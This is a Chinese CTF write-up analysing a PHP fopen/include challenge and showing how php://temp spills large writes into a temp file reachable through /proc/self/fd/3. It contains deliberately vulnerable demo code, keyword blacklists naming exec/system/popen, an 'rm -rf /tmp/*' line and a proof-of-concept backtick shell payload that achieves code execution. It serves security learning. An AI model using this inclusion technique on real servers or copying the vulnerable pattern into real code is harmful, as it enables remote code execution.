0x00 前言
=======

在青少年强网杯结束之后看了一下题目, 其中一道通过fopen打开一个文件资源, 并且通过这个资源进行数据的写入并且读出之后进行include的题目吸引了我的注意, 至于原因的话就是这里用到了我早前就关注到的一个`php://`伪协议,而这次刚好对php支持的各个协议简单学习了一下,也是发现了一点新的特性。

0x01 题目
=======

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['file'])&&strlen($_GET['file'])>strlen("flag in cream")){
    die("too long,no flag");
}
$fp = fopen($_GET['file'], 'r+');
if(preg_match("/php|file|http|eval|exec|system|popen|flag|\<|\>|\"|\'/i", $_GET['content'])){
    die("hacker");
}
fputs($fp, $_GET['content']);
rewind($fp);
$data=stream_get_contents($fp);
include($data);
?>
```

题目需要传入两个参数`file`和`content`,

1. file参数长度不能大于13
2. content需要通过以下过滤`/php|file|http|eval|exec|system|popen|flag|\<|\>|\"|\'/i`

执行以下操作

1. 同时兼备读写权限的条件通过`fopen`打开`file`得到一个`文件指针资源fp`
2. 将`content`写入资源中
3. 重置资源指针
4. 读出`fp`中的内容存入`data`中
5. include包含`data`

我们需要先知道的一点是fopen只能打开当前已经存在的文件而不会创建这个不存在文件, 并且需要拥有指定文件对应的权限才行, 否则就会打开文件失败, 因此这里我们并不能通过/tmp/xxx这种方式打开一个文件进行读写, 那么在这里选择那个文件好呢?

因为条件比较严文件需要控制在13字符内并且还需要对文件拥有读写权限, 所以我在看到的时候并没有想去直接找一个有读写权限的文件, 而是先翻手册找了下fopen支持打开的协议, 然后就看到了`php://`协议中的`php://temp`和`php://memory`

看一下这两个伪协议的解释:

![image-20220911021711780](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-18b18d68d9b5a91806077f4986bc82106c67331f.png)

所以我这里就直接使用了`php://temp`,解决了`file`参数之后再来看一下`content`参数, 需要注意的是`content`并不是include包含的文件内容, 而是作为文件名被include包含, 到这里我第一个想到的就是`陆师傅使用php://filter的骚操作`:[hxp CTF 2021 - The End Of LFI](https://tttang.com/archive/1395/), 但是因为过滤了php所以直接就ban掉了这个思路, 甚至读取本地文件的file协议也被ban了, 在这里想了很久也没有头绪, 因为include支持的本地包含协议也就那么几种, 也有想过使用data://协议但是这需要打开`allow_url_include`而一般情况下都是不打开的, 但是后面学弟告诉我就直接用data协议的时候我呆住了(这就意味着`allow_url_include`是开的,操作空间一下子就大起来了,感觉这个题就是要胆子大,没其他的了...)

0x02 一些相关协议的观察
==============

题目并不复杂, 但是因为使用了`php://temp`这个我早前便注意到了的伪协议, 刚好没别的事干所以我便又继续跟进去看了一下其他的一些fopen支持打开的协议,

发现`允许同时读写`的协议有

```php
file://
phar://
ssh2://
        ssh2.shell
        ssh2.exec
        ssh2.tunnel
        ssh2.sftp
php://memory
php://temp
php://fd
```

1. file://协议便不必多说了,用和没用几乎没差别
2. phar:// 这个协议同时支持读写到也在情理之中,但是我这里开了一个docker找了一下phar文件发现系统默认根本不存在phar类型的文件,所以也就没显现出其用处了
    
    ![image-20220911025740708](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-8a4d6ece6dcc6bd6858d7119ce977a3fa32389e3.png)
3. ssh2://这个协议下面有多个子协议都是`允许同时读写`的,但是其中的`ssh2.scp只支持读取`
    
    因为ssh2://协议的检测肯定需要进行一定格式的交互,而且貌似默认情况下是不支持该协议的所以我这里直接就放弃了没有构造socket会话进行测试
4. php://memory和php://temp我们先来看一下这两个协议的官方解释:
    
    > ​ php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 [sys\_get\_temp\_dir()](https://www.php.net/manual/zh/function.sys-get-temp-dir.php) 的方式一致。
    > 
    > ​ php://temp 的内存限制可通过添加 `/maxmemory:NN` 来控制，`NN` 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。
    
    这里对`php://temp`的额外写入的解释在我以前初次看到的时候并没有引起我的注意,但是这次我再次关注到了这个点,这个点很重要,先记一下
5. php://fd
    
    php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。 这里一开始我希望可以通过`php://fd/xxx`读取到`/proc/self/fd/xxx`对应的文件描述符指向的文件, 但是在我测试之后发现其实不然, 这个描述符并没能让我通过`file_get_contents`函数获取到对应的文件内容, 从`php://fd/0`到`php://fd/2`打开失败我能理解,但是手册中已经使用了3这个描述符(这个描述符我查看/proc/self/fd/4看到其指向的始终是一个socket或者pipe管道),这个打开失败并没有太多疑问
    
    ![image-20220911034051838](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b4fa30b61bd832f05b20d303497867309fb2a59a.png)
    
    但是当我将fd改到有指定对应的文件的描述符的时候, 还是打开失败, 这点不禁让我产生了疑惑,这个php://fd所指向的文件描述符到底是什么??????

0x03 php://temp的使用
==================

在这次再看到这个点的时候,我第一个联想到的是今年自从HFCTF之后变为几乎Web手必知的Nginx描述符包含方法, 在Nginx中就是数据大小超限后(大概32Kb)将数据写入一个随机文件名的文件中, 但是同时会在`/proc/self/fd`下产生一个指向它的文件描述符从而产生了文件包含。

所以当php://temp的临时数据到达默认的2Mb之后将数据写入临时文件, 这时候会不会产生描述符呢?

答案是会的,下面是测试代码:

```php
<?php
var_dump(sys_get_temp_dir());
$fp = fopen("php://temp", 'r+');
system("ls -al /proc/self/fd");
fputs($fp, str_repeat("a",4*1024*1024));
system("ls -al /proc/self/fd");
```

执行结果:

![image-20220911035854479](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0a62eb67d5e7d52cee63252ca874053c60038b2d.png)

对比向`php://temp`写入数据前后`/proc/self/fd`目录的变化,可以看到多了一个3描述符指向了`/tmp/phphoOVvF`问价,而这个文件格式显然就是php的临时文件格式

对代码稍作修改输出一下/tmp下的文件看一下内容是什么

```php
<?php
var_dump(sys_get_temp_dir());
$fp = fopen("php://temp", 'r+');
system("ls -al /tmp");
echo "---\n";
fputs($fp, str_repeat("a",4*1024*1024));
system("ls -al /tmp");
echo "---\n";
system("cat /tmp/php*");
```

![image-20220911040459721](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-406d97de6d9cf8281fec3bd33d63a7ac283eb2ad.png)

可以看到数据写入前后多出的`/tmp/phpxxxxxx`其文件内容就是我们写入的3Mb大小的数据"a"

此外说明一点: 我们上传临时文件在Apache是不会产生fd描述符的,所以以下未说明情况下均默认Apache作为中间件,/var/www/html作为web根目录

所以到这里对这个知识的了解已经到位了,下面我们看一下可以在哪些地方用到(其实利用的局限性还是比较大的,就当一个冷知识吧哈哈):

1. 可以向一个指定的文件写入数据
    
    > 限制:
    > 
    > 
    > 1. 限制了文件格式,或是像这道题目一样限制了指定文件的长度,
    > 2. 使用fopen打开导致我们没那么容易找到拥有对应权限的文件
2. 有一个文件包含点
    
    > 限制:
    > 
    > 
    > 1. 包含的文件名长度做出了限制
    > 2. 对包含的文件名关键字做出了限制导致我们不能使用某些协议
    > 
    > PS:: 要是任意文件包含没长度和Waf限制的话那直接使用p神的pear文件包含再加上陆师傅的[hxp CTF 2021 - The End Of LFI](https://tttang.com/archive/1395/)那直接乱杀

放一个demo:

```php
<?php
system("rm -rf /tmp/*");
chdir("/");//改到根目录防止直接修改./index.php
if(isset($_REQUEST['file'])&&strlen($_REQUEST['file'])>10){
    die("file too long,no flag");
}

if(isset($_REQUEST['include_file'])&&strlen($_REQUEST['include_file'])>15){
    die("include_file too long,no flag");
}
elseif(isset($_REQUEST['include_file'])&& preg_match("/tmp|php|sess/im",$_REQUEST["include_file"])){
    die("include_file have hacker_chars,no flag");//断掉progress文件上传状态和直接包含临时文件的方法
}

if(preg_match("/php|file|ftp|data|http|eval|exec|system|popen|flag|pear|=|\.|\||-/i", $_GET['content'])){
    die("hacker");
}

$fp = fopen($_REQUEST["file"], 'r+');//使用fopen打开的文件必须是已经存在的文件
fputs($fp, $_REQUEST["content"]);//对写入的内容做了不包括<?`$_GET[0]`? >的无效代码限制
include $_REQUEST["include_file"];
```

这里写入的内容可以是能够RCE的代码, 但是写入的文件必须是当前已存在的并且绝对路径总字符数不大于10,包含的文件因为检测`tmp|sess|php`所以包含`pear.php文件`和`php://filter`的方法以及`progress文件上传状态`和`直接包含临时文件`的方法都不可用了,想要解题只有两个方法:

1. 找到满足决定路径不超过10字符的可读写文件进行文件覆写
2. 使用`php://temp`结合`/proc/self/fd/x`包含php://temp写入数据后生产的php临时文件

这里直接设定$\_REQUEST参数进行测试并且在后面添加一个system函数列出fd目录(临时文件的fd稳定为3):

```php
<?php
$_REQUEST["file"]="php://temp";
$_REQUEST["content"]="<?`touch /tmp/111`?>".str_repeat("a",4*1024*1024);
$_REQUEST["include_file"]="/proc/self/fd/3";

system("rm -rf /tmp/*");
chdir("/");//改到根目录防止直接修改./index.php
if(isset($_REQUEST['file'])&&strlen($_REQUEST['file'])>10){
    die("file too long,no flag");
}

if(isset($_REQUEST['include_file'])&&strlen($_REQUEST['include_file'])>15){
    die("include_file too long,no flag");
}
elseif(isset($_REQUEST['include_file'])&& preg_match("/tmp|php|sess/im",$_REQUEST["include_file"])){
    die("include_file have hacker_chars,no flag");//断掉progress文件上传状态和直接包含临时文件的方法
}

if(preg_match("/php|file|ftp|data|http|eval|exec|system|popen|flag|pear|=|\.|\||-/i", $_GET['content'])){
    die("hacker");
}

$fp = fopen($_REQUEST["file"], 'r+');//使用fopen打开的文件必须是已经存在的文件
fputs($fp, $_REQUEST["content"]);//对写入的内容做了不包括<?`$_GET[0]`? >的无效代码限制
system("ls -al /proc/self/fd");
include $_REQUEST["include_file"];
```

执行后::

![image-20220911051003623](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-50bfd43d79af8353220bc5efedebd9a9abc84303.png)

![image-20220911051108898](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ceb11b0fbc8be050eeafaa57f8d81033652ae77b.png)

可以看到命令执行成功, 调完这个简单的知识点居然就不小心就熬到快天亮了,睡了睡了